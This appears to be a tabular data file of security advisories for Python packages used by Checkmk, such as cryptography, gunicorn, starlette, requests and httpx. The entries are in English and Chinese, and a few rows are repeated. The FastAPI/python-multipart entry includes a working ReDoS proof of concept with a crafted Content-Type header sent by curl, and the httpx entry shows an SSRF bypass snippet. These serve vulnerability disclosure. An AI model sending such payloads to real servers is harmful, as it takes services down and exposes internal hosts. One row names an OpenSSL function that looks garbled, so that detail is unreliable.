Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
Checkmk_checkmk,pytest-xdist,,True,,CWE-362,2023-12-06,"## Overview
[pytest-xdist](https://pypi.org/project/pytest-xdist) is a pytest xdist plugin for distributed testing, most importantly across multiple CPUs

Affected versions of this package are vulnerable to Race Condition in the `looponfail` mode where a concurrent file removal could cause a crash.
## Remediation
Upgrade `pytest-xdist` to version 1.6 or higher.
## References
- [GitHub Commit](https://github.com/pytest-dev/pytest-xdist/commit/d9c5f18478db6d1d1584f53ce1b4c1c4feb43f9a)
",3,0
Checkmk_checkmk,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
Checkmk_checkmk,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
Checkmk_checkmk,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
Checkmk_checkmk,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
Checkmk_checkmk,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
Checkmk_checkmk,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
Checkmk_checkmk,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
Checkmk_checkmk,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
Checkmk_checkmk,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
Checkmk_checkmk,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
Checkmk_checkmk,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
Checkmk_checkmk,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
Checkmk_checkmk,fastapi,,True,CVE-2021-32677,CWE-352,2021-06-09,"fastapi-utils是一个应用软件。可重用工具为FastAPI
fastapi-utils存在跨站请求伪造漏洞，该漏洞源于FastAPI 0.65.2版本及以下版本在接收浏览器发送的JSON负载的路径操作中使用cookie进行身份验证，容易受到跨站点请求伪造(CSRF)攻击。",2,2
Checkmk_checkmk,fastapi,,True,CVE-2024-24762,CWE-400 CWE-1333,,python-multipart是由个人开发者Marcelo Trylesinski开发的一个Python流式多部分解析器。该组件用于解析HTTP请求中的内容类型。此漏洞发生在版本0.0.7之前，攻击者可以通过发送特制的Content-Type头部，该头部使得正则表达式解析过程消耗过多的CPU资源，导致服务无法响应其他请求。此问题源于不当的正则表达式使用，造成灾难性回溯，进而使主事件循环无限期停止。,2,1
Checkmk_checkmk,fastapi,,True,,CWE-1333 CWE-400,2024-02-06,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-2jv5-9r88-3w3p. This link is maintained to preserve external references.

## Original Description

### Summary

When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.

An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.

This can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

This only applies when the app uses form data, parsed with `python-multipart`.

### Details

A regular HTTP `Content-Type` header could look like:

```
Content-Type: text/html; charset=utf-8
```

`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74

A custom option could be made and sent to the server to break it with:

```
Content-Type: application/x-www-form-urlencoded; !=\""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
```

This is also reported to Starlette at: https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238

### PoC

Create a FastAPI app that uses form data:

```Python
# main.py
from typing import Annotated
from fastapi.responses import HTMLResponse
from fastapi import FastAPI,Form
from pydantic import BaseModel

class Item(BaseModel):
    username: str

app = FastAPI()

@app.get(""/"", response_class=HTMLResponse)
async def index():
    return HTMLResponse(""Test"", status_code=200)

@app.post(""/submit/"")
async def submit(username: Annotated[str, Form()]):
    return {""username"": username}

@app.post(""/submit_json/"")
async def submit_json(item: Item):
    return {""username"": item.username}
```

Then start it with:

```console
$ uvicorn main:app

INFO:     Started server process [50601]
INFO:     Waiting for application startup.
INFO:     ASGI 'lifespan' protocol appears unsupported.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
```

Then send the attacking request with:

```console
$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
```

#### Stopping it

Because that holds the main loop consuming the CPU non-stop, it's not possible to simply kill Uvicorn with `Ctrl+C` as it can't handle the signal.

To stop it, first check the process ID running Uvicorn:

```console
$ ps -fA | grep uvicorn

  501 59461 24785   0  4:28PM ttys004    0:00.13 /Users/user/code/starlette/env3.10/bin/python /Users/user/code/starlette/env3.10/bin/uvicorn redos_starlette:app
  501 59466 99935   0  4:28PM ttys010    0:00.00 grep uvicorn
```

In this case, the process ID was `59461`, then you can kill it (forcefully, with `-9`) with:

```console
$ kill -9 59461
```

### Impact

It's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data, using `python-multipart`. This way it also affects other libraries using Starlette, like FastAPI.

### Original Report

This was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r

<details>
<summary>Original report to FastAPI</summary>

Hey Tiangolo!

My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).

Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:

```Python
from typing import Annotated
from fastapi.responses import HTMLResponse
from fastapi import FastAPI,Form
from pydantic import BaseModel

class Item(BaseModel):
    username: str

app = FastAPI()

@app.get(""/"", response_class=HTMLResponse)
async def index():
    return HTMLResponse(""Test"", status_code=200)

@app.post(""/submit/"")
async def submit(username: Annotated[str, Form()]):
    return {""username"": username}

@app.post(""/submit_json/"")
async def submit_json(item: Item):
    return {""username"": item.username}
```

I'm running the above with uvicorn with the following command:

```console
uvicorn server:app
```

Then run the following cUrl command:

```
curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
```

You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%

You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.

If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.

Cheers

#### Impact

An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.

#### Occurrences

[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)

</details>",2,2
Checkmk_checkmk,gunicorn,,True,,CWE-20,2021-04-02,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to Improper Input Validation. Gunicorn fails with a 500, instead of a 400, when a request path is a malformed IPv6 address. This is due to no raise 'InvalidRequestLine' exception when the line contains malicious data.
## Remediation
Upgrade `gunicorn` to version 19.4.0 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/b951175c66c353d10127a20a62f61e834829856c)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/1023)
",4,0
Checkmk_checkmk,gunicorn,,True,,CWE-444,2020-01-09,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to HTTP Request Smuggling. It fails to properly process the `Transfer-Encoding` and `Content-Length` headers when both are present in a package request. This allows for conflicting information to be sent regarding the length of the package, which when processed by back-end servers under certain configurations would allow for malicious users to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
## Remediation
Upgrade `gunicorn` to version 19.10.0, 20.0.1 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/c5be1bae5c42b1e600be22d0655fc3ec4e4711cb)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/2176)
- [GitHub PR](https://github.com/benoitc/gunicorn/pull/2181)
- [Gunicorn ChangeLog](https://docs.gunicorn.org/en/stable/news.html#id1)
- [HTTP Request Smuggling Security Blog](https://portswigger.net/web-security/request-smuggling)
",3,0
Checkmk_checkmk,gunicorn,,True,CVE-2018-1000164,CWE-93,2018-04-18,"gunicorn是一款基于UNIX平台的Python WSGI HTTP服务器软件。

gunicorn 19.4.5版本中的nicorn/http/wsgi.py文件的‘process_headers’函数存在安全漏洞。攻击者可利用该漏洞造成服务器返回任意的HTTP包头。",2,2
Checkmk_checkmk,gunicorn,,True,CVE-2024-1135,CWE-444,,Gunicorn是一个开源的Python WSGI HTTP服务器，旨在处理网络请求并提供高性能的Web服务。该组件存在HTTP请求走私漏洞，原因在于对`Transfer-Encoding`标头的验证不当，攻击者可以通过构造包含相互冲突的`Transfer-Encoding`标头的请求，从而绕过安全限制，访问受限的端点。此漏洞的触发条件是用户的网络路径未能过滤无效请求。,2,1
Checkmk_checkmk,gunicorn,,True,CVE-2024-6827,CWE-444,,Gunicorn是一个开源的Python Web服务器网关接口（WSGI）HTTP服务器。Gunicorn版本21.2.0未能正确验证'Transfer-Encoding'头的值，导致在RFC标准中规定的默认回退方法为'Content-Length'，使其易受TE.CL请求夹带攻击。攻击者可以通过构造特定的HTTP请求来利用此漏洞，造成缓存中毒、数据泄露、会话操纵、SSRF、XSS、DoS、数据完整性损害、安全绕过、信息泄漏和业务逻辑滥用等问题。,2,1
Checkmk_checkmk,h11,,True,CVE-2025-43859,CWE-444,2025-04-25,<p>python-hyper h11库是一个用于处理HTTP/1.1协议的Python库，允许用户实现HTTP客户端与服务端的交互。CVE-2025-43859漏洞涉及h11库对某些错误格式的Chunked-Encoding消息体的接收，导致在特定条件下可能出现请求走私漏洞。此问题源于h11在解析Chunked-Encoding消息体的行终止符时的不严格处理，攻击者可以利用这一点进行请求走私，从而操控HTTP请求的解释。</p>,1,1
Checkmk_checkmk,httpx,,True,,CWE-20,2022-05-13,"## Overview
[httpx](https://pypi.org/project/httpx) is a The next generation HTTP client.

Affected versions of this package are vulnerable to Improper Input Validation due to improper implementation of `httpx.URL().copy_with`, that causes `httpx.Client` and `httpx.Proxy` to parse wrong URL. Exploiting this vulnerability leads to blacklist bypass.

## PoC:

**httpx.Client**

```python
user_input_from_http_request = 'http:////admin-dashboard/secret'
u = httpx.URL(user_input_from_http_request)
assert u.host.lower() != 'admin-dashboard'
resp = httpx.Client(base_url=u).get('/') # SSRF to http://admin-dashboard/secret
print(resp.text) # sensitive data leak
```

**httpx.Proxy**

```python
user_input_from_http_request = 'http://x@//internal-proxy:8082/'
u = httpx.URL(user_input_from_http_request)
assert u.host.lower() != 'internal-proxy'
# httpx.Proxy(u).url.netloc == b'internal-proxy:8082'
resp = httpx.Client(proxies=u).get('/') # will request via http proxy at internal-proxy:8082
```
## Remediation
Upgrade `httpx` to version 0.23.0 or higher.
## References
- [GitHub Commit](https://github.com/encode/httpx/pull/2185/commits/e3c495a32c63d8aa7f1bcf3b7b27ee1a0ff428e1)
- [GitHub Issue](https://github.com/encode/httpx/issues/2184)
- [GitHub PR](https://github.com/encode/httpx/pull/2185)
",3,0
Checkmk_checkmk,httpx,,True,CVE-2021-41945,CWE-20,2022-04-28,"Encode OSS httpx是英国Encode OSS公司的一个功能齐全的 HTTP 客户端。提供同步和异步 API，支持 HTTP/1.1 和 HTTP/2。
Encode OSS httpx 1.0.0 版本及其之前版本存在输入验证错误漏洞，该漏洞源于httpx.URL和httpx.Client和httpx.URL.copy_with的函数输入验证不当。",1,2
Checkmk_checkmk,python-multipart,,True,CVE-2024-53981,CWE-770,2024-12-02,python-multipart 是一个用于 Python 的流式多部分解析器，用于解析表单数据。在解析过程中，python-multipart 会跳过第一个边界前的换行符 (CR \r 或 LF \n) 及最后一个边界后的任何尾部字节。此过程逐字节执行，并在每次操作时发出一个日志事件，可能会因为某些输入导致过多日志记录。攻击者可以通过发送包含大量数据的恶意请求，在第一个边界之前或最后一个边界之后，从而导致高 CPU 负载并阻塞处理线程较长时间。对于 ASGI 应用程序，这可能导致事件循环停滞并阻止其他请求的处理，从而导致拒绝服务 (DoS)。,2,2
Checkmk_checkmk,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
Checkmk_checkmk,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
Checkmk_checkmk,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
Checkmk_checkmk,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
Checkmk_checkmk,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
Checkmk_checkmk,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
Checkmk_checkmk,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
Checkmk_checkmk,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
Checkmk_checkmk,starlette,,True,,CWE-400,2023-02-15,,3,0
Checkmk_checkmk,starlette,,True,CVE-2023-30798,CWE-400,2023-02-15,"Starlette是Encode开源的一个轻量级的 ASGI 框架/工具包。非常适合用 Python 构建异步 web 服务。
Encode Starlette 0.25.0之前版本存在安全漏洞。攻击者利用该漏洞指定任意数量的表单字段或文件，导致内存使用过多，从而导致HTTP服务拒绝服务。",2,2
Checkmk_checkmk,starlette,,True,CVE-2024-47874,CWE-770,2024-10-15,<p>Starlette 是 Encode 开源的一个轻量级的 ASGI 框架/工具包，非常适合用 Python 构建异步 web 服务。Starlette 0.40.0 版本之前存在一个安全漏洞，源于缺乏对用户进行适当的访问控制和验证，可能允许未授权的用户访问受限资源。</p>,2,2
Checkmk_checkmk,starlette,,True,CVE-2025-54121,CWE-770,2025-07-21,Starlette 是一个快速的异步 Python Web 框架，常用于构建高性能的 Web 应用程序和 API。该漏洞涉及 Starlette 在解析多部件表单时处理大文件的机制，具体来说，当文件大小超过默认最大缓冲区大小时，Starlette 会将文件转存到磁盘，这一过程会阻塞主线程，导致无法接受新的连接。漏洞的成因是代码未能正确判断文件是否需要转存到磁盘，导致事件线程阻塞。,3,2
Checkmk_checkmk,starlette,,True,CVE-2025-62727,CWE-407,2025-10-28,"Starlette 是一个轻量级的 ASGI 框架和工具包，主要用于构建基于 Python 的异步 Web 服务。它支持高性能的异步请求处理，并提供如路由、中间件、静态文件服务等功能。

此漏洞出现在 Starlette 的 FileResponse 组件中，该组件用于处理文件响应，例如通过 StaticFiles 或直接使用 FileResponse 提供静态文件服务时。
在 0.49.1 版本之前，未经身份验证的攻击者可以发送一个精心构造的 HTTP Range 头，触发 FileResponse 的 Range 头解析和合并逻辑中的二次时间复杂度处理。具体来说，FileResponse 的 `_parse_range_header()` 方法在解析多范围请求时，使用的正则表达式存在 O(n^2) 的复杂度，导致处理时间显著增加。此外，合并逻辑通过扫描整个结果列表进一步放大了这种复杂度，从而使每个请求能够引发 CPU 资源的耗尽，导致拒绝服务攻击。
该漏洞的技术细节包括：
- 使用 `_RANGE_PATTERN` 正则表达式解析 Range 头部时，处理时间复杂度为 O(n^2)。
- 合并范围时，遍历结果列表进行比较，也会导致 O(n^2) 的处理时间。
攻击者可以通过构造包含多个小的、不重叠的范围或特定数字子串的 Range 头，最大化处理复杂度。
该问题影响所有使用 FileResponse 或 StaticFiles 提供文件服务的 Starlette 应用程序，同时也间接影响基于 Starlette 构建的框架，例如 FastAPI。",2,1
Checkmk_checkmk,uvicorn,,True,CVE-2020-7695,CWE-74,2020-07-20,"Encode OSS Uvicorn是英国Encode OSS公司的一款基于uvloop和httptools构建的ASGI（Web服务器网关接口）服务器。
Encode OSS Uvicorn 0.11.7之前版本中存在注入漏洞，该漏洞源于程序没有转义HTTP标头中的CRLF序列。攻击者可利用该漏洞向HTTP相应中添加任意标头或使其返回任意相应主体。",2,2
Checkmk_checkmk,uvicorn,,True,,CWE-362,2023-08-01,"## Overview
[uvicorn](https://github.com/encode/uvicorn) is a lightning-fast ASGI server.

Affected versions of this package are vulnerable to Race Condition in the `uvicorn/protocols/http` component that leads Quart to hang with uvicorn. This vulnerability may allow an attacker to disrupt the server's response handling process under certain conditions, leading to potential Denial of Service (DoS) or other adverse impacts.
## Remediation
Upgrade `uvicorn` to version 0.12.3 or higher.
## References
- [GitHub Commit](https://github.com/encode/uvicorn/commit/de213614b7f8309f411e30a31d274d01b129607d)
- [GitHub PR](https://github.com/encode/uvicorn/pull/848)
- [GitHub Release](https://github.com/encode/uvicorn/releases/tag/0.12.3)
",3,0
Checkmk_checkmk,uvicorn,,True,CVE-2020-7694,CWE-94 CWE-116,2020-07-20,"Encode OSS Uvicorn是英国Encode OSS公司的一款基于uvloop和httptools构建的ASGI（Web服务器网关接口）服务器。
Encode OSS uvicorn（所有版本）中存在安全漏洞。攻击者可借助特制的URL利用该漏洞污染uvicorn的访问日志，影响此类文件的完整性。",2,0
Checkmk_checkmk,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
Checkmk_checkmk,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
